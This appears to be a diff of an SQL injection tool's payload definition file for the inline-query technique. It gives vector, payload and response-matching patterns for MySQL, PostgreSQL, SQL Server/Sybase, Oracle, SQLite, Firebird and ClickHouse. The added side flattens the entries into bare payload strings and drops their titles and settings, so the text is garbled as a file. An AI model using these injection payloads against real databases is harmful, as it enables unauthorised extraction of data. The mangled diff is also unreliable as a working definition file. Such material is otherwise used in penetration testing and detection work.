@@ -1,106 +1,41 @@
-root
-test
-title Generic inline queries
-stype 3
-level 1
-risk 1
-clause 1,2,3,8
-where 3
-vector (SELECT CONCAT(CONCAT('h3FLXCZM67MPDZ8Cu',(kZahxHf)),'UNION'))
-request
-payload (SELECT CONCAT(CONCAT('TTjq0whWpkOhqruLk',(CASE WHEN (43=19) THEN '1' ELSE '0' END)),'UNION'))
-response
-grep 9Y6UTGK9PrAv5XVbB(?P<result>.*?)UNION
-title MySQL inline queries
-stype 3
-level 2
-risk 1
-clause 1,2,3,8
-where 3
-vector (SELECT CONCAT('tEKxJtVtXxgveVQ7Y',(rLgHDvf),'UNION'))
-request
-payload (SELECT CONCAT('Fd7zGLnCk2JKcH9gJ',(ELT(2=8,1)),'UNION'))
-response
-grep Jp9P8dvjU4Te2WVLg(?P<result>.*?)UNION
-details
+(SELECT CONCAT(CONCAT('h3FLXCZM67MPDZ8Cu',(kZahxHf)),'UNION'))
+
+(SELECT CONCAT(CONCAT('TTjq0whWpkOhqruLk',(CASE WHEN (43=19) THEN '1' ELSE '0' END)),'UNION'))
+9Y6UTGK9PrAv5XVbB(?P<result>.*?)UNION
+(SELECT CONCAT('tEKxJtVtXxgveVQ7Y',(rLgHDvf),'UNION'))
+
+(SELECT CONCAT('Fd7zGLnCk2JKcH9gJ',(ELT(2=8,1)),'UNION'))
+Jp9P8dvjU4Te2WVLg(?P<result>.*?)UNION
 dbms MySQL
 title PostgreSQL inline queries
-stype 3
-level 2
-risk 1
-clause 1,2,3,8
-where 3
-vector (SELECT 't9hRZpf7ay0XLKsAq'||(LWYbYlX)::text||'UNION')
-request
-payload (SELECT 'haijtNmYE4wjnv5RN'||(SELECT (CASE WHEN (92=43) THEN 1 ELSE 0 END))::text||'UNION')
-response
-grep L5esVmpr1QwIVw8DD(?P<result>.*?)UNION
-details
+(SELECT 't9hRZpf7ay0XLKsAq'||(LWYbYlX)::text||'UNION')
+
+(SELECT 'haijtNmYE4wjnv5RN'||(SELECT (CASE WHEN (92=43) THEN 1 ELSE 0 END))::text||'UNION')
+L5esVmpr1QwIVw8DD(?P<result>.*?)UNION
 dbms PostgreSQL
 title Microsoft SQL Server/Sybase inline queries
-stype 3
-level 2
-risk 1
-clause 1,2,3,8
-where 3
-vector (SELECT '9o2YlCjkT6QVfMnG5'+(VuwBJxX)+'UNION')
-request
-payload (SELECT 'SRbbK9RfBpCcAScs8'+(CASE WHEN (28=57) THEN '1' ELSE '0' END)+'UNION')
-response
-grep IHKmpxkK7DLJ0n1vY(?P<result>.*?)UNION
-details
+(SELECT '9o2YlCjkT6QVfMnG5'+(VuwBJxX)+'UNION')
+
+(SELECT 'SRbbK9RfBpCcAScs8'+(CASE WHEN (28=57) THEN '1' ELSE '0' END)+'UNION')
+IHKmpxkK7DLJ0n1vY(?P<result>.*?)UNION
 dbms
 Microsoft SQL Server
 Sybase
 title Oracle inline queries
-stype 3
-level 2
-risk 1
-clause 1,2,3,8
-where 3
-vector (SELECT ('dERspzuupqTK1pCNj'||(jnqNzVV)||'UNION') FROM DUAL)
-request
-payload (SELECT 'Ma0HAwhdO1IVVR6TX'||(CASE WHEN (25=69) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'UNION' FROM DUAL)
-response
-grep gC85pijk9QF9LCpli(?P<result>.*?)UNION
-details
-dbms Oracle
-title SQLite inline queries
-stype 3
-level 3
-risk 1
-clause 1,2,3,8
-where 3
-vector SELECT 'C3uGgDoDgSEYb7EAc'||(NTdRsEC)||'UNION'
-request
-payload SELECT 'vxiaVr5XmFPo537ng'||(CASE WHEN (33=38) THEN 1 ELSE 0 END)||'UNION'
-response
-grep ktRS2h4xXgqhMO7D1(?P<result>.*?)UNION
-details
-dbms SQLite
-title Firebird inline queries
-stype 3
-level 3
-risk 1
-clause 1,2,3,8
-where 3
-vector SELECT 'WQXawauW0gBSuK6YD'||(IctJDmm)||'UNION' FROM RDB$DATABASE
-request
-payload SELECT 'iZjsftsvyhA8x46Gp'||(CASE 26 WHEN 57 THEN 1 ELSE 0 END)||'UNION' FROM RDB$DATABASE
-response
-grep WSfMbb4DhuV6RXQic(?P<result>.*?)UNION
-details
-dbms Firebird
-title ClickHouse inline queries
-stype 3
-level 3
-risk 1
-clause 1,2,3,8
-where 3
-vector ('2Nh533LDCcHCavRjT'||CAST((tNYsJqJ) AS String)||'UNION')
-request
-payload ('r2Me8ZMNYEYUZEklW'||(CASE WHEN (41=7) THEN '1' ELSE '0' END)||'UNION')
-response
-grep Y73HYBIWNKTiSwbKw(?P<result>.*?)UNION
-details
-dbms ClickHouse
+(SELECT ('dERspzuupqTK1pCNj'||(jnqNzVV)||'UNION') FROM DUAL)
+
+(SELECT 'Ma0HAwhdO1IVVR6TX'||(CASE WHEN (25=69) THEN TO_NUMBER(1) ELSE TO_NUMBER(0) END)||'UNION' FROM DUAL)
+gC85pijk9QF9LCpli(?P<result>.*?)UNION
+SELECT 'C3uGgDoDgSEYb7EAc'||(NTdRsEC)||'UNION'
+
+SELECT 'vxiaVr5XmFPo537ng'||(CASE WHEN (33=38) THEN 1 ELSE 0 END)||'UNION'
+ktRS2h4xXgqhMO7D1(?P<result>.*?)UNION
+SELECT 'WQXawauW0gBSuK6YD'||(IctJDmm)||'UNION' FROM RDB$DATABASE
+
+SELECT 'iZjsftsvyhA8x46Gp'||(CASE 26 WHEN 57 THEN 1 ELSE 0 END)||'UNION' FROM RDB$DATABASE
+WSfMbb4DhuV6RXQic(?P<result>.*?)UNION
+
+('2Nh533LDCcHCavRjT'||CAST((tNYsJqJ) AS String)||'UNION')
+
+('r2Me8ZMNYEYUZEklW'||(CASE WHEN (41=7) THEN '1' ELSE '0' END)||'UNION')
+Y73HYBIWNKTiSwbKw(?P<result>.*?)UNION
